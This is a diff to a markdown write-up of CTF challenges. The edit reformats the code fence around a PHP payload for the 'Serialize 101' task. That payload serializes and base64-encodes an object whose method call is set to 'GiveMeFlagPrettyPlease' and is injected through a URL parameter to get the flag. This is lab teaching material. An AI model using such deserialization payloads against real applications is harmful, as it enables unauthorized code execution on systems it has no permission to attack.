@@ -47,8 +47,9 @@ Go to ```URL.ctf/?identity=(insert JWT)``` (reminder; the token is only valid fo
 
 ### Serialize 101
 Look at the source code and change the WelcomeMessage function by the function that outputs the base64 string, GiveMeFlagPrettyPlease()<br>
-This is the final payload:<br>
-```<?php
+This is the final payload:
+```
+<?php
     class Hackademy{
         private $call = "GiveMeFlagPrettyPlease";
     }   
@@ -61,8 +62,8 @@ This is the final payload:<br>
     echo "Encoded:\n";
     echo base64_encode($serialized);
     echo "\n";
-?>```
-
+?>
+```
 I then use the output in the URL parameter, and it gives me the flag :)
 
 ### Forgery 101
